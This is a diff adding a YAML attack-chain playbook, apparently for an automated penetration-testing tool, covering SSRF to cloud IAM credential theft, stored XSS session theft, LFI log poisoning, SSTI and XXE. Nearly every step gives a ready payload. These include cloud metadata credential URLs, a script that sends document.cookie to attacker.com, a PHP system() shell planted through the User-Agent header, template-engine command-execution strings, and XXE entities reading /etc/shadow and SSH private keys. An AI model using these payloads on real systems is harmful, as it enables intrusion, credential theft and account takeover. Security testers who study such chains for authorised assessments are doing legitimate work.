@@ -1,0 +1,137 @@
+id: ssrf-xss-chains
+category: attack_chains
+name: SSRF, XSS, and Server-Side Attack Chains
+
+chains:
+  ssrf_to_cloud_metadata:
+    name: "SSRF -> Cloud Metadata -> IAM Credential Theft"
+    description: "Exploit SSRF to access cloud provider metadata and steal IAM credentials"
+    severity: critical
+    prerequisites:
+      - "Confirmed SSRF (URL parameter accepting internal requests)"
+      - "Target hosted on AWS/GCP/Azure"
+    steps:
+      - step: 1
+        action: "Probe cloud metadata endpoint"
+        techniques:
+          aws: "http://169.254.169.254/latest/meta-data/"
+          gcp: "http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)"
+          azure: "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (header: Metadata: true)"
+        tool: "http_request"
+      - step: 2
+        action: "Extract IAM credentials"
+        techniques:
+          aws: "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
+          gcp: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        tool: "http_request"
+      - step: 3
+        action: "Test internal service discovery"
+        targets:
+          - "http://localhost:8080 (application servers)"
+          - "http://localhost:6379 (Redis)"
+          - "http://localhost:9200 (Elasticsearch)"
+          - "http://localhost:5432 (PostgreSQL)"
+        tool: "ssrf_test"
+    impact: "Cloud account compromise, lateral movement to other services"
+    cwe_chain: ["CWE-918", "CWE-200", "CWE-269"]
+
+  xss_to_account_takeover:
+    name: "Stored XSS -> Session Hijacking -> Account Takeover"
+    description: "Inject persistent XSS to steal session tokens from other users"
+    severity: high
+    prerequisites:
+      - "Confirmed stored XSS in user-visible content"
+    steps:
+      - step: 1
+        action: "Confirm XSS payload persistence"
+        technique: "Inject <script>alert(document.domain)</script> in stored field"
+        tool: "xss_test"
+      - step: 2
+        action: "Craft session theft payload"
+        technique: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
+        tool: "http_request"
+      - step: 3
+        action: "Chain with CSRF"
+        technique: "Use XSS to submit cross-origin requests on behalf of victim"
+        tool: "http_request"
+    impact: "Session hijacking, account takeover of any user viewing the page"
+    cwe_chain: ["CWE-79", "CWE-384", "CWE-352"]
+
+  lfi_to_rce:
+    name: "LFI -> Log Poisoning -> Remote Code Execution"
+    description: "Chain local file inclusion with log poisoning for code execution"
+    severity: critical
+    prerequisites:
+      - "Confirmed LFI (path traversal reading /etc/passwd or similar)"
+    steps:
+      - step: 1
+        action: "Identify readable log files"
+        targets:
+          - "/var/log/apache2/access.log"
+          - "/var/log/nginx/access.log"
+          - "/var/log/auth.log"
+          - "/proc/self/environ"
+        tool: "path_test"
+      - step: 2
+        action: "Inject PHP code into log"
+        technique: "Send request with User-Agent: <?php system($_GET['c']); ?>"
+        tool: "http_request"
+      - step: 3
+        action: "Trigger code execution via LFI"
+        technique: "Include the poisoned log file: ?file=../../../var/log/apache2/access.log&c=id"
+        tool: "http_request"
+    impact: "Remote code execution on the web server"
+    cwe_chain: ["CWE-22", "CWE-117", "CWE-94"]
+
+  ssti_to_rce:
+    name: "SSTI -> Template Engine RCE"
+    description: "Escalate server-side template injection to remote code execution"
+    severity: critical
+    prerequisites:
+      - "Confirmed SSTI (math probe like {{7*7}}=49)"
+    steps:
+      - step: 1
+        action: "Identify template engine"
+        probes:
+          jinja2: "{{config.items()}}"
+          twig: "{{_self.env.getFilter('id')}}"
+          freemarker: "${\"freemarker\".class.forName(\"java.lang.Runtime\")}"
+          thymeleaf: "__${T(java.lang.Runtime).getRuntime().exec('id')}__"
+          velocity: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))"
+        tool: "injection_test"
+      - step: 2
+        action: "Execute RCE payload"
+        techniques:
+          jinja2: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+          twig: "{{['id']|filter('system')}}"
+          freemarker: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+        tool: "http_request"
+    impact: "Remote code execution via template engine"
+    cwe_chain: ["CWE-1336", "CWE-94"]
+
+  xxe_to_data_exfil:
+    name: "XXE -> Internal File Read -> Sensitive Data Extraction"
+    description: "Exploit XML external entity injection to read server files"
+    severity: high
+    prerequisites:
+      - "XML parsing endpoint (file upload, SOAP, API)"
+    steps:
+      - step: 1
+        action: "Test basic XXE"
+        technique: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
+        tool: "path_test"
+      - step: 2
+        action: "Extract high-value files"
+        targets:
+          - "file:///etc/passwd (user enumeration)"
+          - "file:///etc/shadow (password hashes, requires root)"
+          - "file:///proc/self/environ (environment variables, secrets)"
+          - "file:///app/.env (application secrets)"
+          - "file:///root/.ssh/id_rsa (SSH private key)"
+        tool: "http_request"
+      - step: 3
+        action: "Test blind XXE with OOB exfiltration"
+        technique: "Use oob(action='setup') then DTD with external entity to callback URL"
+        tool: "oob"
+    impact: "Server file read, credential theft, potential RCE"
+    cwe_chain: ["CWE-611", "CWE-200"]
